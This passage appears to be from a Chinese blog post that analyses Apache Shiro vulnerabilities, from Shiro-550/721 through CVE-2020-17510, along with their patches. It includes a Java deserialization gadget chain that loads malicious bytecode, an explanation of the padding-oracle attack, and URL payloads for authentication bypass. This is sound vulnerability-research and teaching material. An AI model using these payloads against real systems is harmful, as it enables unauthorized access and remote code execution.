而1.9+版本的CB修改了一些类的serialVersionUID，也就是java序列化的唯一标识，所以会报错 CC链打shiro550虽然已经有了CB无依赖打shiro550这条链，但是还是写一下关于CC链打shiro的链子吧 先把cc依赖放进去 然后我们先随便找个对应的cc链打一下 可以发现计算器没弹出来，然后在shiro的控制台里可以看见有这种报错 一个是Transformer类没加载出来，另一个是不能对字节数组反序列化 这个问题具体的原因可以看这个Shiro反序列化漏洞(二)-shiro下的CC链利用，是tomcat的类加载器的问题 简单的原因是Shiro 使用 ClassResolvingObjectInputStream 执行反序列化的操作，这个类重写了 resolveClass ，实际使用 ClassLoader.loadClass() 方式而非 ObjectInputStream 中的 Class.forName() 的方式。而 forName 的方式可以加载任意的数组类型，loadClass 只能加载原生的类型的 Object Array。 p牛的结论是 如果反序列化流中包含非 Java 自身的数组，则会出现无法加载类的错误。 现在一般有两种解决方法 使用 RMI 中的 Gadget 做跳板，再执行 CC 反序列化链，这样可以加载； 改造 CC 链，组合 InvokerTransformer 与 TemplatesImpl，避免使用 Transformer 数组。 rmi学的不是很精，还不太懂怎么利用rmi攻击，所以就先写写第二种 首先看上边这个图，我们之所以要用Transformer数组类，最主要的问题就是通过transform执行runtime.exec的时候我们需要控制输入，也就必须用transform数组。所以这里我们选用加载恶意字节码文件的方式 然后由于不能有transform数组类型，所以就不能用ConstantTransformer和InvokerTransformer形成链条的这种方式 所以这里我们选用CC6的前半段加CC3的后半段 public class cc &#123; public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123; &#x2F;&#x2F;cc3 TemplatesImpl templates &#x3D; new TemplatesImpl(); &#x2F;&#x2F; _name赋值不为null Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;123&quot;); &#x2F;&#x2F; _class赋值为null Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;); classField.setAccessible(true); classField.set(templates,null); &#x2F;&#x2F;加载恶意类的字节码 Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;)); &#x2F;&#x2F;转为二维数组 byte[][] codes &#x3D; &#123;code&#125;; bytecodes.set(templates,codes); InvokerTransformer newTransformer &#x3D; new InvokerTransformer(&quot;newTransformer&quot;, null, null); &#x2F;&#x2F;cc6 HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;(); Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap,new ConstantTransformer(&quot;1&quot;)); TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,templates); HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;123&quot;); Class LazyMapClass &#x3D; LazyMap.class; Field factory &#x3D; LazyMapClass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(decorate,newTransformer); decorate.clear(); file.serialize(hashMap,&quot;ser.bin&quot;); file.unserialize(&quot;ser.bin&quot;); &#125; &#125; 调用链就是从hashmap到TiedMapEntry再到LazyMap，通过LazyMap触发TemplatesImpl的newTransformer，加载恶意字节码 漏洞修复升级shiro版本到1.2.5 Shiro 在 1.2.5 的更新 Commit-4d5bb00 中针对此漏洞进行了修复，描述为：Force RememberMe cipher to be set to survive JVM restart.If the property is not set, a new cipher will be generated. 也就是说，应用程序需要用户手动配置一个 cipherKey，如果不设置，将会生成一个新 key。 CVE-2016-6802漏洞信息 漏洞信息 详情 漏洞编号 CVE-2016-6802 / CNVD-2016-07814 影响版本 shiro &lt; 1.3.2 漏洞描述 Shiro 使用非根 servlet 上下文路径中存在安全漏洞。远程攻击者通过构造的请求， 利用此漏洞可绕过目标 servlet 过滤器并获取访问权限。 漏洞关键字 绕过 | Context Path | 非根 | /x/../ 漏洞补丁 Commit-b15ab92 相关链接 https://www.cnblogs.com/backlion/p/14055279.html 漏洞详解这个洞感觉也没啥好跟的，就是在获取路径的导致的绕过问题（我也不想配环境了 在访问路径的前添加 /任意目录名/../，即可绕过认证权限进行访问 Shiro通过调用 WebUtils.getContextPath() 方法，获取 javax.servlet.include.context_path 属性或调用 request.getContextPath() 获取 Context 值。 由于获取的 Context Path 没有标准化处理，如果是非常规的路径，例如 CVE-2010-3863 中出现过的 /./，或者跳跃路径 /su18/../，都会导致在 StringUtils.startsWithIgnoreCase() 方法判断时失效，直接返回完整的 Request URI 。 这样 Shiro 匹配不到配置路径，就会在某些配置下发生绕过 漏洞修复Shiro 在 1.3.2 版本的更新 Commit-b15ab92 中针对此漏洞进行了修复。 CVE-2019-12422漏洞信息 漏洞信息 详情 漏洞编号 CVE-2019-12422 / CNVD-2016-07814 / SHIRO-721 影响版本 shiro &lt; 1.4.2 (1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1) 漏洞描述 RememberMe Cookie 默认通过 AES-128-CBC 模式加密，这种加密方式容易受到 Padding Oracle Attack 攻击，攻击者利用有效的 RememberMe Cookie 作为前缀， 然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击。 漏洞关键字 反序列化 | RememberMe | Padding | CBC 漏洞补丁 Commit-a801878 相关链接 https://blog.skullsecurity.org/2016/12 https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/ https://codeantenna.com/a/OwWV5Ivtsi Shiro721，也是一个Cookie的反序列化 漏洞详解本次漏洞实际并不是针对 shiro 代码逻辑的漏洞，而是针对 shiro 使用的 AES-128-CBC 加密模式的攻击，首先了解一下这种加密方式。（一字不差搬过来的 AES-128-CBCAES 全称 Advanced Encryption Standard （高级加密标准），是一种为了取代其前任标准（DES）而成为新标准的对称分组加密算法。这里有几个关键字： 对称：所谓对称加密，即使用同一组 key 进行明文和密文的转换。 分组加密算法：将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密。常见的有 ECB、CBC、PCBC、CFB、OFB、CTR 等几种算法。 分组长度固定为 128bit 。 密钥 key 的长度可以为 128 bit（16字节）、192 bit（24字节）、256 bit（32字节）。根据密钥的长度不同，推荐加密轮数也不同，上述三个密钥长度分别迭代 10/12/14 轮。加密轮数越多，安全性越好，同时也更耗费时间。 因此 AES-128-CBC 模式就代表使用 AES 密钥长度为 128 bit，使用 CBC 分组算法的加密模式。 再来了解一下 CBC，全称 Cipher Block Chaining (密文分组链接模式)，简单来说，是一种使用前一个密文组与当前明文组 XOR 后再进行加密的模式。 关于 AES 加解密流程实现可以看这篇文章，关于 CBC 分组的实现可以看这篇文章。这里就不占篇幅描述了。 CBC 模式下，有三种填充方式，用于在分组数据不足时，在结尾进行填充，用于补齐： NoPadding：不填充，明文长度必须是 16 Bytes 的倍数。 PKCS5Padding：以完整字节填充 , 每个填充字节的值是用于填充的字节数 。即要填充 N 个字节 , 每个字节都为 N。 ISO10126Padding：以随机字节填充 , 最后一个字节为填充字节的个数。 Shiro 中使用的是 PKCS5Padding，也就是说，可能出现的 padding byte 值只可能为： 1 个字节的 padding 为 0x01 2 个字节的 padding 为 0x02,0x02 3 个字节的 padding 为 0x03,0x03,0x03 4 个字节的 padding 为 0x04,0x04,0x04,0x04 ... 当待加密的数据长度刚好满足分组长度的倍数时，仍然需要填充一个分组长度，也就是说，明文长度如果是 16n，加密后的数据长度为 16(n+1) 。 Padding Oracle AttackPadding Oracle Attack 就是针对 CBC 模式分组加密算法的一种攻击手段，可以查看这篇文章学习，英文有困难的小伙伴可以查看这篇文章，说的非常清晰。 这里还是简单的描述一下攻击思路，在加密时，最后一个分组如果长度不够，会进行填充，然后使用倒数第二个分组的密文作为 IV 进行异或，然后进行 AES 加密。 在解密时，先对密文组（CiperText）使用密钥 (Key) 进行 AES 解密，得到一个中间值（MediumValue），然后再异或 IV (也就是上一个密文组) 就会得到这个分组的明文分组（PlainText）。 这个明文分组，是经过 PKCS5Padding 规范填充过的，因此它一定是遵从 PKCS5Padding 的规范的，这个规范就是本次的攻击验证点。 Padding Oracle Attack 就是利用了异或的魅力以及 PKCS5Padding 规范的可穷举性进行的攻击，wikipedia 中给出解释： 这个攻击逻辑我想了小一天，看了 fynch3r 师傅的博客，又咨询了下，最后想通了，这里用比较清晰的话描述出来，供跟我一样密码学和数学基础较差的朋友理解： 攻击者修改倒数第二组密文的最后一个字节，发送到服务器，服务器解密后得到 MediumValue，将其与攻击者修改后的倒数第二组密文异或，得到 PlainText，然后对其进行 Padding 校验，此时校验大概率会失败，因为修改过的密文与 MediumValue 异或后不是原本的 Padding 了。 此时攻击者遍历修改倒数第二组密文的最后一个字节 ( 0x00 - 0xFF , 最多遍历 255 次 )，使其与 MediumValue 异或，直到最后一个字节异或的结果是 0x01 ，这样得到的 PlainText 是符合 Padding 规范的，攻击者期待程序返回不一样的结果进行判断。这种情况下攻击者可以知道：MediumValue 异或攻击者遍历修改倒数第二组密文的结果的最后一个字节为 0x01 ，根据异或的运算法则，MediumValue 最后一个字节就是 0x01 异或攻击者修改的字节。此时攻击者得到了 MediumValue[8] 的值。此时攻击者知道了 MediumValue[8] 的值，还可以知道原倒数第二组密文最后一个字节的值，就可以计算出原 PlainText[8] 的值， 接下来攻击者遍历修改倒数第二组密文的倒数第二个字节，此时攻击者希望异或运算后得到的明文分组的最后两个字节为 0x02 0x02，这样是符合 Padding 规范的，并且由于已经计算了出了 PlainText[8] 的值，因此在这轮遍历中可以用原倒数第二组密文最后一个字节的值异或PlainText[8]再异或 0x02 作为倒数第二组密文的最后一个字节，因为它与 MediumValue[8] 的异或一定为 0x02，攻击者依旧只需要遍历第二组密文的倒数第二个字节即可。 依次类推，可以依次计算出最后一组密文中全部的 MediumValue 及 PlainText。 舍弃掉最后一组密文，向服务器提交第一组至倒数第二组密文，迭代之前的操作，获得倒数第二组明文。依次规律，直到获得所有分组的明文。 看了全网，发现这部分流程还是 Epicccal 师傅的相关博客写的最为清晰。 至此，攻击者可以在不知道密钥 Key 的情况下得到全部明文的值。但这有两个前提： 服务器会对解密结果进行 padding 校验，并且结果可以从响应中进行判断（类似 SQL 盲注）。 攻击者已知能正确解密和使用的密文以及初始向量 IV。 CBC Byte-Flipping Attack到现在已经可以使用 Padding Oracle Attack 在不知道 key 的情况下获取全部明文的值，但这仅仅是信息泄露，能不能进一步篡改信息呢？这里就用到了 CBC 字节翻转攻击。 相关原理可看这篇文章以及这篇文章。这里还是简单描述：通过修改密文进而篡改明文。 在解密时，会使用 MediumValue 与上一组密文进行异或来得到明文，现在知道上一组密文，也知道本组的明文，就能计算出本组的 MediumValue，如果想要异或出不一样的数据，我们只需要篡改上一组的密文，使其跟 MediumValue 能异或出指定的数据即可。 这是一个逆推的过程： 获取最后一组密文，由 Padding Oracle Attack 爆破出其 MediumValue ，根据篡改后的明文与 MediumValue 异或，得到前一轮的密文。 再使用计算出来的前一轮的密文继续爆破出对应的 MediumValue，再根据篡改后的明文进行异或，再得到前一轮的密文。 以此类推到第一组，异或出的值作为起始 IV。 拼接起始 IV 以及全部计算出的每组的密文即可获得一个可以使服务器解密为指定明文数据的密文了。 Padding Oracle Attack简单说就是通过PKCS5的给不满足长度的分组补后缀的方式来爆破出明文的内容 比如我现在构造了个全是0x00的倒数第二组密文C2，那么倒数第一组密文C1再经过解密后变为一个我们不知道的KEY(C1)，此时若要最终解密完成，还要与C2进行异或操作，也就是C2^KEY(C1)。 那么由于我现在可以控制C2，也就能控制最终得到的明文，而又由于明文遵循PKCS5的填充方式，因此我们可以通过爆破让C2的最后一个字符异或KEY(C1)的最后一个字符为0x01，那么此时C2^KEY(C1) = 0x01，我们就能算出KEY(C1)的最后一个字符，然后再让C2的后两个字符异或KEY(C1) 等于0x02，我们就能得到KEY(C1)的倒数第二个字符，以此类推得到整个KEY(C1)。 那我们知道KEY(C1)异或一个真正的第二组密文得到的就是明文，那假如我们知道了真正的倒数第二组密文，就能得到最后一组密文所对应的明文 所以Padding Oracle Attack的利用条件就是 可以修改密文 已知密文和iv CBC Byte-Flipping Attack简单来说，和Padding Oracle Attack原理差不多，唯一的差别是我们通过Padding Oracle Attack知道了KEY(C1)的值，那么我们就可以去构造恶意的C2，让最终系统解密出来的明文是我们想要的内容了 shiro721就是利用这种方式，让我们在不知道加密密钥的情况下，通过修改RememberMe使其解密后的内容成为我们反序列化的payload。反序列化的链子和550是一样的。 但是一个字节最多要爆破255次，一个分组有十六个字节，所以一个分组最多要爆破255 * 16 = 4080次，按照shiro550的payload长度，感觉最少要十几万次爆破。 漏洞修复在 1.4.2 版本的更新 Commit-a801878 中针对此漏洞进行了修复 ，在父级类 JcaCipherService 中抽象出了一个 createParameterSpec() 方法返回加密算法对应的类。 并在 AesCipherService 中重写了这个方法，默认使用 GCM 加密模式，避免此类攻击。 CVE-2020-1957漏洞信息 漏洞信息 详情 漏洞编号 CVE-2020-1957 / CNVD-2020-20984 / SHIRO-682 影响版本 shiro &lt; 1.5.2 漏洞描述 Spring Boot 中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL 利用 Shiro 和 SpringBoot 对 URL 的处理的差异化，可以绕过 Shiro 对 SpringBoot 中的 Servlet 的权限控制，越权并实现未授权访问。 漏洞关键字 SpringBoot | 差异化处理 | / | 绕过 漏洞补丁 Commit-589f10d &amp;&amp; Commit-9762f97 &amp;&amp; Commit-3708d79 相关链接 SHIRO-742 https://www.openwall.com/lists/oss-security/2020/03/23/2 CVE-2020-2957 -&gt; ? 漏洞详解不想搭环境了，感觉路径解析的问题也没啥好分析源码的，所以就直接抄了（ SHIRO-682本漏洞起源于 SHIRO-682，Issues 描述了在 SpingWeb 中处理 requestURI 与 shiro 中匹配鉴权路径差异导致的绕过问题：在 Spring 中，/resource/menus 与 /resource/menus/ 都可以访问资源，但是在 shiro 中，这两个路径是成功匹配的，所以在 Spring 集成 shiro 时，只需要在访问路径后添加 &quot;/&quot; 就存在绕过权限校验的可能。 其实就是 spring 在分发请求时，会从 DispatcherServlet#handlerMappings 找到能匹配路径的 Handler，会遍历匹配路径，负责匹配的 PathPattern#match 方法对 &quot;/admin/list/&quot; 和 &quot;/admin/list&quot; 的匹配会返回 true。 绕过除了上面的漏洞，本 CVE 通报版本号内还存在一个另一个绕过。利用的是 shiro 和 spring 对 url 中的 &quot;;&quot; 处理的差别来绕过校验。 然，绕过的原理就是访问 /aaaadawdadaws;/..;wdadwadadw/;awdwadwa/audit/list 这个请求的时候会被 shiro 和 spring 解析成不同的结果。 先来看下 shiro，之前提到过，shiro 会用自己处理过的 RequestURI 和配置的路径进行匹配，具体的方法就是 WebUtils#getRequestUri，方法先调用 decodeAndCleanUriString 方法处理请求路径，再调用 normalize 方法标准化路径。decodeAndCleanUriString 方法逻辑如下，可以看到，对 URL 中存在 &quot;;&quot; 的处理是直接截断后面的内容。 那 Spring 是怎么处理的呢？方法是 UrlPathHelper#decodeAndCleanUriString ，方法名也叫 decodeAndCleanUriString，你说巧不巧？其实一点也不巧，这分明就是 shiro 抄 spring 的作业。 方法里一次执行了 3 个动作：removeSemicolonContent 移除分号，decodeRequestString 解码，getSanitizedPath 清理路径，具体描述如下图： 其中出现差异的点就在于 UrlPathHelper#removeSemicolonContent ，逻辑如下图： 可以看到，spring 处理了每个 / / 之间的分号，均把 &quot;;&quot; 及之后的内容截取掉了。所以当请求 /aaaadawdadaws;/..;wdadwadadw/;awdwadwa/audit/list 进入到 UrlPathHelper#decodeAndCleanUriString 方法时，会逐渐被处理： removeSemicolonContent：&quot;/aaaadawdadaws/..//audit/list&quot; decodeRequestString：&quot;/aaaadawdadaws/..//audit/list&quot; getSanitizedPath：&quot;/aaaadawdadaws/../audit/list&quot; 这样再标准化就会成为正常的 &quot;/audit/list&quot;。 这种思路是哪里来的呢？其实又是抄了 Tomcat 的处理思想，处理逻辑位于 org.apache.catalina.connector.CoyoteAdapter#parsePathParameters 如下图 也就说，在 Tomcat 的实现下，对于访问 URL 为 &quot;/aaaadawdadaws;/..;wdadwadadw/;awdwadwa/audit/list&quot; 的请求，使用 request.getServletPath() 就会返回 &quot;/audit/list&quot;。 而由于 spring 内嵌 tomcat ，又在处理时借鉴了它的思路，所以导致 UrlPathHelper#getPathWithinServletMapping 方法其实无论如何都会返回经过上述处理逻辑过后的路径，也就是 &quot;/audit/list&quot;。 了解了这个处理机制后，这个路径就可以被花里胡哨的改为： http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;123;&#x2F;..;345&#x2F;;..&#x2F;.;&#x2F;su18&#x2F;..;&#x2F;;&#x2F;;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;;&#x2F;;&#x2F;;awdwadwa&#x2F;audit&#x2F;list 依然可以绕过校验： 经测试，上面这个 payload 只能在较低版本的 Spring Boot 上使用。为什么呢？直接引用Ruil1n 师傅的原文: 当 Spring Boot 版本在小于等于 2.3.0.RELEASE 的情况下，alwaysUseFullPath 为默认值 false，这会使得其获取 ServletPath ，所以在路由匹配时相当于会进行路径标准化包括对 %2e 解码以及处理跨目录，这可能导致身份验证绕过。而反过来由于高版本将 alwaysUseFullPath 自动配置成了 true 从而开启全路径，又可能导致一些安全问题。 针对这方面的内容，截止至本文发出前，先知上有师傅发出了tomcat容器url解析特性研究，对其中的相关内容进行了详述，可移步观看。 在高版本上不处理跨目录，就只能借助 shiro 一些配置问题尝试绕过：比如应用程序配置了访问路径 &quot;/audit/**&quot; 为 anon，但是指定了其中的一个 &quot;/audit/list&quot; 为 authc。这时在不跳目录的情况下，可以使用如下请求绕过： http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;audit&#x2F;&#x2F;;aaaa&#x2F;;...&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;;&#x2F;;&#x2F;;awdwadwa&#x2F;list 漏洞修复首先是针对 SHIRO-682 的修复，共提交了两次，第一次为 Commit-589f10d ，如下图，可以看到是在 PathMatchingFilter#pathsMatch 方法中添加了对访问路径后缀为 &quot;/&quot; 的支持。 同时在 PathMatchingFilterChainResolver#getChain 也添加了同样的逻辑。 第二次是 Commit-9762f97，是修复由于上一次提交，导致访问路径为 &quot;/&quot; 时抛出的异常。可以看到除了 endsWith 还添加了 equals 的判断。 然后是对使用 &quot;;&quot; 绕过的修复 Commit-3708d79， 可以看到 shiro 不再使用 request.getRequestURI() 来获取用户妖魔鬼怪的请求路径，而是使用 request.getContextPath()、request.getServletPath()、request.getPathInfo() 进行拼接，直接获取中间件处理后的内容。 CVE-2020-11989漏洞信息 漏洞信息 详情 漏洞编号 CVE-2020-11989 / SHIRO-782 影响版本 shiro &lt; 1.5.3 漏洞描述 由安全研究员 Ruilin 以及淚笑发现在 Apache Shiro 1.5.3 之前的版本， 将 Apache Shiro 与 Spring 动态控制器一起使用时，特制请求可能会导致身份验证绕过。 漏洞关键字 Spring | 双重编码 | %25%32%66 | 绕过 | context-path | /;/ 漏洞补丁 Commit-01887f6 相关链接 https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/ https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA 漏洞详解AntPathMatcher 绕过根据腾讯玄武实验室官方给出的漏洞细节文章，本漏洞是需要几个利用条件的，接下来看一下具体的细节。 Shiro 支持 Ant 风格的路径表达式配置。ANT 通配符有 3 种，如下表： 通配符 说明 ? 匹配任何单字符 * 匹配0或者任意数量的字符 ** 匹配0或者更多的目录 在之前的测试和使用中，常见的就是 /** 之类的配置，匹配路径下的全部访问请求，包括子目录及后面的请求，如：/admin/** 可以匹配 /admin/list 以及 /admin/get/id/2 等请求。 另外一个类似的配置是 /* ，单个 * 不能跨目录，只能在两个 / 之间匹配任意数量的字符，如 /admin/* 可以匹配 /admin/list 但是不能匹配 /admin/get/id/2。 Shiro 对于 Ant 风格路径表达式解析的支持位于 AntPathMatcher#doMatch 方法中，这里简单说一下其中的逻辑： 首先判断配置的表达式 pattern 和访问路径 path 起始是否均为 / 或均不是，如果不同则直接返回 false。 然后将 pattern 和 path 均切分为 String 类型的数组。 然后开始循环判断 pattern 和 path 对应位置的配置和路径是否有匹配，判断使用 AntPathMatcher#matchStrings 方法。 AntPathMatcher#matchStrings 方法又把字符拆分成 char 数组，来进行匹配尝试，并支持 * 以及 ? 类型的通配符的匹配。 本次漏洞涉及到的配置则是使用 * 配置。再再次重温一下 shiro 的处理逻辑： WebUtils#getRequestUri 方法使用 request.getContextPath()/request.getServletPath()/request.getPathInfo() 获取用户请求路径，然后调用 decodeAndCleanUriString 方法解码并取出 ; 之后的内容，然后调用 normalize 标准化路径。 decodeAndCleanUriString 方法逻辑之前贴过，这里再贴一次。 而漏洞就出在此逻辑处，各位看官集中注意力，我来描述一下： 以前的 shiro 使用 request.getRequestURI() 获取用户请求路径，并自行处理，此时 shiro 默认Servlet 容器（中间件）不会对路径进行 URL 解码操作，通过其注释可以看到； 在 1.5.2 版本的 shiro 更新中，为了修复 CVE-2020-1957 ，将 request.getRequestURI() 置换为了 valueOrEmpty(request.getContextPath()) + &quot;/&quot; + valueOrEmpty(request.getServletPath()) + valueOrEmpty(request.getPathInfo());，而对于 request.getContextPath() 以及 request.getPathInfo()，以 Tomcat 为例的中间件是会对其进行 URL 解码操作的，此时 shiro 再进行 decodeAndCleanUriString，就相当于进行了两次的 URL 解码，而与之后的 Spring 的相关处理产生了差异。 这其中细节，可以查看 mi1k7ea 师傅发表在先知上的文章，我这里截取其中的一小段。 至此已经发现了 shiro 中的路径处理差异问题，由于 shiro 会二次解码路径，因此 %25%32%66 将会被 shiro 解码为 /，而如果只解码一次， %25%32%66 只会被处理成 %2f。 此时如果使用了单个 &quot;*&quot; 的通配符，将产生差异化问题，例如如下配置，配置了 /audit/*： 此时访问 /audit/list，/audit/aaa 之类的请求，都会被 shiro 拦截，需要进行权限校验。 但是如果访问 /audit/aa%25%32%66a，在 shiro 处理时，会将其处理为 /audit/aa/a，此路径并不能被 /audit/* 配置项匹配到，因此会绕过 shiro 校验。而在后续 spring 逻辑中会处理成 /audit/aa%2fa，可能会绕过请求。 找到了差异点，接下来就要找场景了，Ruil1n 师傅找到了当 Spring 在参数中使用 PathVariable 注解从 RequestMapping 中的占位符中取数据的场景，可以满足上面的情况，如下图： 漏洞复现如下，正常访问：/audit/aaaa 会跳转至登录页面： 使用 %25%32%66 绕过，可以发现绕过： 这里还有一个限制，由 PathVariable 注解的参数只能是 String 类型，如果是其他类型的参数，将会由于类型不匹配而无法找到对应的处理方法。 ContextPath 绕过这个绕过实际上是对上一个 CVE 思路上的延伸，在 CVE-2020-1957 中，借助了 shiro 和 spring 在获取 requestURI 时对 ; 的处理差异，以及 /../ 在路径标准化中的应用，进行了权限绕过。 而这次的绕过，则是在 ContextPath 之前使用 /;/ 来绕过，访问如：/;/spring/admin/aaa 路径，根据已经了解到的知识： shiro 会截取掉 ; 之后的路径，按照 / 来匹配； spring 会把路径标准化为 /spring/admin/aaa 来匹配。 这就产生了 shiro 鉴权的路径和 spring 处理的路径不同造成的绕过。 淚笑提供了他的漏洞环境。复现如下： 同样，上面这个 payload 只能在较低版本的 Spring Boot 上使用，原因与之前提到过的一致。 漏洞修复Shiro 在 Commit-01887f6 中提交了针对上述两个绕过的更新。 首先 shiro 回退了 WebUtils#getRequestUri 的代码，并将其标记为 @Deprecated。并建议使用 getPathWithinApplication() 方法获取路径减去上下文路径，或直接调用 HttpServletRequest.getRequestURI() 方法获取。 其次是在 WebUtils#getPathWithinApplication 方法，修改了使用 RequestUri 去除 ContextPath 的减法思路，改为使用 servletPath + pathInfo 的加法思路。加法过后使用 removeSemicolon 方法处理分号，normalize 方法标准化路径。 getServletPath 和 getPathInfo 方法逻辑如下： 更新后，shiro 不再处理 contextPath，不会导致绕过，同时也避免了二次 URL 解码的问题。 CVE-2020-13933漏洞信息 漏洞信息 详情 漏洞编号 CVE-2020-13933 / CNVD-2020-46579 影响版本 shiro &lt; 1.6.0 漏洞描述 Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。 漏洞关键字 Spring | 顺序 | %3b | 绕过 漏洞补丁 Commit-dc194fc 相关链接 https://xz.aliyun.com/t/8223 漏洞详解这个 CVE 实际上是对上一个 CVE 中 AntPathMatcher 绕过方式的再次绕过。 在上一个 CVE 的修复补丁中提到，Shiro 使用了 servletPath + pathInfo 的加法思路获取访问 URI。获取两者值的方法均为从 attribute 中获得对应的值，如果为空则调用 request.getXX 对应的方法进行获取，加法过后使用 removeSemicolon 方法处理分号，normalize 方法标准化路径。之前也提到过，request.getXX 方法，会进行 URL 解码操作。 这里需要注意的是处理顺序的问题，按照上述逻辑，shiro 对于路径的处理，会先 URL 解码，再处理分号，然后标准化路径。 这个顺序将会与 Spring 及 Tomcat 产生差异，之前提到过，在 UrlPathHelper#decodeAndCleanUriString 方法中，是后两者是先处理分号，再 URL 解码，然后标准化路径。 这一差异将会导致，当请求中出现了 ; 的 URL 编码 %3b 时，处理顺序的不同将会带来结果不同导致绕过： shiro 会 url 解码成 ;，然后截断后面的内容，进行匹配，例如 /audit/aaa%3baaa -&gt; /audit/aaa。 spring &amp; tomcat 会处理成 /audit/aaa;aaa。 两者处理后的结果不同，就造成了绕过。差异点找到了，接下来就是场景，也同样依赖 PathVariable 注解 String 类型的参数。 这里有一个点是，对于使用了 /audit/* 配置的鉴权，无法是匹配 /audit/ 的。 因此，对于配置了 /audit/* 的鉴权，可以使用 /audit/%3baaa 来使 shiro 处理成 /audit/，并结合在 spring 中 PathVariable 的场景即可实现绕过。 漏洞复现如下： 漏洞修复本次漏洞修复位于 Commit-dc194fc 中，在这此更新中，shiro 没有改动现有的处理逻辑，而是选择了使用全局过滤和处理的方式。 Shiro 创建了一个 global 的 filter：InvalidRequestFilter，这个类继承了 AccessControlFilter。用来过滤和阻断有危害的请求，会返回 400 状态码，其中包括： 带有分号的请求； 带有反斜线的请求； 非 ASCII 字符。 这个类是根据 spring-security 中的 StrictHttpFirewall 类编写而来。 其中关键的 isAccessAllowed 方法会进行逐个校验。 shiro 将 InvalidRequestFilter 配置在 Global Filter 中。 并使其默认匹配 &quot;/**&quot;，使其可以全局匹配进行过滤校验。 CVE-2020-17510漏洞信息 漏洞信息 详情 漏洞编号 CVE-2020-17510 / CNVD-2020-60318 影响版本 shiro &lt; 1.7.0 漏洞描述 Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。 漏洞关键字 Spring | 编码 | %2e | 绕过 | /%2e%2e/ 漏洞补丁 Commit-6acaaee 相关链接 https://lists.apache.org/thread/12bn9ysx6ogm830stywro4pkoq8dxzfk 漏洞详解本漏洞还是对 AntPathMatcher 的继续绕过。之前已经尝试了 ; 的 URL 编码，/ 的双重 URL 编码的绕过，都是因为 Shiro 先 url 解码再标准化和处理的逻辑与 Spring 不同导致的。 那还有什么字符的 URL 编码可能导致问题呢？常见的 URL 中还有什么字符能用呢？答案就是 .，. 的 URL 编码为 %2e。 当一个 %2e 出现在请求中时，会发生什么事呢？很显然，shiro 会将其当做 . 处理，而 Spring 会将其当做字符 %2e 处理。 此时如果 %2e 出现的位置正确，就可以在 shiro 处理后消失，造成差异，例如访问：&quot;/audit/%2e/&quot;： Shiro url decode：&quot;/audit/./&quot; Shiro 标准化路径：&quot;/audit/&quot; Spring 标准化路径：&quot;/audit/%2e/&quot; Spring url decode：&quot;/audit/.&quot; 由此可见，Shiro 匹配的路径和 Spring 匹配的路径相差了一个字符 &quot;.&quot;，将造成绕过。此时依旧借助单个 &quot;*&quot; 的通配符以及 PathVariable 注解 String 类型的参数的场景触发漏洞。 可以使用的 payload 包括： /%2e /%2e/ /%2e%2e /%2e%2e/ 因为上面的写法都会被 shiro 的标准化路径处理掉，并且同时能被 PathVariable 注解 String 类型的参数匹配到。 漏洞修复Shiro 在 Commit-6acaaee 中提交了本次漏洞的修复。 在本次修复中可以看到，Shiro 的思路再次转变，不再按照 Spring 和 Tomcat 改自己的处理代码，也不再给自己加代码来适配 Spring，而是创建了 UrlPathHelper 的子类 ShiroUrlPathHelper，并重写了 getPathWithinApplication 和 getPathWithinServletMapping 两个方法，全部使用 Shiro 自己的逻辑 WebUtils#getPathWithinApplication 进行返回。 在之前的分析中我们知道，Spring 与 Shiro 处理逻辑之间的差异就在这个位置，而现在 Shiro 直接把代码逻辑重写，通过注入自己的代码来修改 Spring 的相关逻辑，用来保证二者没有差异。究竟是怎么注入的呢？在配置类中 import 了 ShiroRequestMappingConfig 类。 ShiroRequestMappingConfig 类会向 RequestMappingHandlerMapping#urlPathHelper 设置为 ShiroUrlPathHelper。 设置后，Spring 匹配 handler 时获取路径的逻辑就会使用 Shiro 提供的逻辑，保持了二者逻辑的一致。从而避免了绕过的情况。 注意这里需要注意的是，Shiro 官方对这个漏洞的修复非常坑，根据官方给出的信息，Shiro 将修复放在了 shiro-spring-boot-web-starter 包中，也就是使用了 shiro-spring-boot-web-starter 进行配置的项目，升级版本才会使防御代码生效，才会注入 ShiroUrlPathHelper 。 如果你没有使用shiro-spring-boot-web-starter 自动配置，而是引入 shiro-spring 自己进行注入 Bean，单纯的升级版本是无法防御本次 CVE 的，需要： 根据这个链接中的代码来进行手动配置； 或根据这个链接将 ShiroRequestMappingConfig 添加在 auto configuration 配置中。 如果不配置，将无法有效防御此 CVE。 绕过这个修复在当时来看，如果配置正确，防御能力是 